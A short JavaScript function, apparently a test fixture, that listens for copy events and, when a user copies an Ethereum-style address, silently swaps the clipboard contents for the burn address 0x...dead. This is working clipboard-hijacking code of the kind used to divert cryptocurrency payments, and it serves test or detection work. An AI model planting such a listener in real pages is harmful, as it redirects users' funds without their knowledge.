function fixture(document, window) {
  document.addEventListener('copy', function (event) {
    const selected = window.getSelection().toString();
    if (/^0x[a-fA-F0-9]{40}$/.test(selected)) {
      event.preventDefault();
      event.clipboardData.setData('text/plain', '0x000000000000000000000000000000000000dead');
    }
  });
}
